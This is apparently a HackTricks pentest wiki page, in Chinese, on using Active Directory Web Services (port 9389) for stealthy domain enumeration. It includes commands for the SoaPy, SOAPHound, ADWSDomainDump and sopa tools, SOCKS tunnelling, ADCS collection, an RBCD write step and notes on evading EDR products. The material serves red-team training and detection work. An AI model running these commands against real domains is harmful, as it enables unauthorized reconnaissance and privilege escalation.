# Active Directory Web Services (ADWS) 枚举 & 隐蔽采集

{{#include ../../banners/hacktricks-training.md}}

## ADWS 是什么？

Active Directory Web Services (ADWS) 是自 Windows Server 2008 R2 起 **在每台 Domain Controller 上默认启用** 的服务，监听 TCP **9389**。尽管名称包含 Web，**实际上不涉及 HTTP**。该服务通过一套专有的 .NET 封装协议以 LDAP 风格暴露数据：

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

由于流量被封装在这些二进制 SOAP 帧中并通过一个不常见的端口传输，**通过 ADWS 进行枚举比传统的 LDAP/389 & 636 流量更不容易被检查、过滤或基于签名检测**。对操作者的意义包括：

* 更隐蔽的侦察——蓝队通常集中在 LDAP 查询上。
* 可以通过 SOCKS 代理隧道化 9389/TCP，从 **非 Windows 主机（Linux、macOS）** 收集数据。
* 获取与 LDAP 相同的数据（users、groups、ACLs、schema 等），并能执行**写操作**（例如为 **RBCD** 设置 `msDs-AllowedToActOnBehalfOfOtherIdentity`）。

ADWS 交互基于 WS-Enumeration：每次查询以一个定义 LDAP 过滤器/属性的 `Enumerate` 消息开始，并返回一个 `EnumerationContext` GUID，随后通过一个或多个 `Pull` 消息按服务器定义的窗口流式返回结果。Contexts 大约在 ~30 分钟后过期，因此工具要么需要分页结果，要么按 CN 前缀拆分过滤器以避免丢失状态。当请求 security descriptors 时，指定 `LDAP_SERVER_SD_FLAGS_OID` 控制以省略 SACLs，否则 ADWS 会在其 SOAP 响应中直接丢弃 `nTSecurityDescriptor` 属性。

> NOTE: ADWS 也被许多 RSAT GUI/PowerShell 工具使用，因此流量可能与合法的管理员活动混合。

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) 是用纯 Python **完整重实现 ADWS 协议栈** 的项目。它逐字节构造 NBFX/NBFSE/NNS/NMF 帧，允许在类 Unix 系统上收集而无需触及 .NET 运行时。

### 主要功能

* 支持通过 SOCKS 进行 proxying（对 C2 implants 很有用）。
* 与 LDAP `-q '(objectClass=user)'` 相同的细粒度搜索过滤器。
* 可选的 **写操作**（`--set` / `--delete`）。
* 用于直接导入到 BloodHound 的 **BOFHound 输出模式**。
* 当需要可读性时，`--parse` 标志可美化时间戳 / `userAccountControl`。

### 针对性采集标志与写操作

SoaPy 附带经策划的开关，复现了通过 ADWS 执行的最常见 LDAP 搜寻任务：`--users`、`--computers`、`--groups`、`--spns`、`--asreproastable`、`--admins`、`--constrained`、`--unconstrained`、`--rbcds`，以及用于自定义拉取的原始 `--query` / `--filter`。将这些与写原语配合使用，例如 `--rbcd <source>`（设置 `msDs-AllowedToActOnBehalfOfOtherIdentity`）、`--spn <service/cn>`（为针对性 Kerberoasting 做 SPN 阶段）和 `--asrep`（在 `userAccountControl` 中翻转 `DONT_REQ_PREAUTH`）。

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
使用相同的主机/凭据立即将发现武器化：使用 `--rbcds` 转储支持 RBCD 的对象，然后应用 `--rbcd 'WEBSRV01$' --account 'FILE01$'` 来构建一个 Resource-Based Constrained Delegation 链（参见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) 以获取完整的滥用路径）。

### 安装（操作员主机）
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* `ldapdomaindump` 的一个分支，将 LDAP 查询替换为通过 TCP/9389 的 ADWS 调用，以减少 LDAP-signature 命中。
* 默认会对 9389 进行初始可达性检查，除非传入 `--force`（如果端口扫描会造成噪声或被过滤，可跳过探测）。
* 已在 Microsoft Defender for Endpoint 和 CrowdStrike Falcon 上测试，README 中记录了成功绕过的情况。

### 安装
```bash
pipx install .
```
### Usage
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
典型输出记录了对 9389 的可达性检查、ADWS bind，以及 dump 的开始/结束：
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - 用于 ADWS 的实用客户端 (Golang)

类似于 soapy，[sopa](https://github.com/Macmod/sopa) 在 Golang 中实现了 ADWS 协议栈 (MS-NNS + MC-NMF + SOAP)，并暴露命令行标志以发出诸如以下的 ADWS 调用：

* **对象搜索与检索** - `query` / `get`
* **对象生命周期** - `create [user|computer|group|ou|container|custom]` 和 `delete`
* **属性编辑** - `attr [add|replace|delete]`
* **账户管理** - `set-password` / `change-password`
* 以及其他如 `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` 等。

## SOAPHound – 大规模 ADWS 收集 (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) 是一个 .NET 收集器，它将所有 LDAP 交互保持在 ADWS 内部并输出与 BloodHound v4 兼容的 JSON。它一次性构建 `objectSid`, `objectGUID`, `distinguishedName` 和 `objectClass` 的完整缓存（`--buildcache`），然后在高吞吐量的 `--bhdump`, `--certdump` (ADCS) 或 `--dnsdump` (AD-integrated DNS) 过程中重复使用该缓存，因此只有大约 ~35 个关键属性会离开 DC。AutoSplit（`--autosplit --threshold <N>`）会自动按 CN 前缀拆分查询，以便在大型林中保持在 30 分钟 EnumerationContext 超时之内。

在加入域的操作员 VM 上的典型工作流程：
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exported JSON slots directly into SharpHound/BloodHound workflows—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit makes SOAPHound resilient on multi-million object forests while keeping the query count lower than ADExplorer-style snapshots.

## 隐蔽的 AD 收集工作流

下面的工作流展示了如何通过 ADWS 枚举 **域 & ADCS 对象**，将它们转换为 BloodHound JSON 并搜索基于证书的攻击路径 —— 全部在 Linux 上完成：

1. **从目标网络将 9389/TCP 隧道到你的主机**（例如通过 Chisel、Meterpreter、SSH 动态端口转发等）。导出 `export HTTPS_PROXY=socks5://127.0.0.1:1080` 或使用 SoaPy 的 `--proxyHost/--proxyPort`。

2. **收集根域对象：**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **从 Configuration NC 收集与 ADCS 相关的对象:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **转换为 BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **在 BloodHound GUI 中上传 ZIP** 并运行 cypher 查询，例如 `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`，以揭示证书提升路径（ESC1、ESC8 等）。

### 写入 `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
将此与 `s4u2proxy`/`Rubeus /getticket` 结合，以完成完整的 **Resource-Based Constrained Delegation** 链（参见 [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)）。

## 工具汇总

| 用途 | 工具 | 说明 |
|------|------|------|
| ADWS 枚举 | [SoaPy](https://github.com/logangoins/soapy) | Python、SOCKS、读/写 |
| 大规模 ADWS 转储 | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET、优先使用缓存、BH/ADCS/DNS 模式 |
| BloodHound 导入 | [BOFHound](https://github.com/bohops/BOFHound) | 转换 SoaPy/ldapsearch 日志 |
| 证书妥协 | [Certipy](https://github.com/ly4k/Certipy) | 可以通过相同的 SOCKS 代理 |
| ADWS 枚举与对象更改 | [sopa](https://github.com/Macmod/sopa) | 用于与已知 ADWS 端点交互的通用客户端 - 允许进行枚举、对象创建、属性修改和密码更改 |

## 参考资料

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
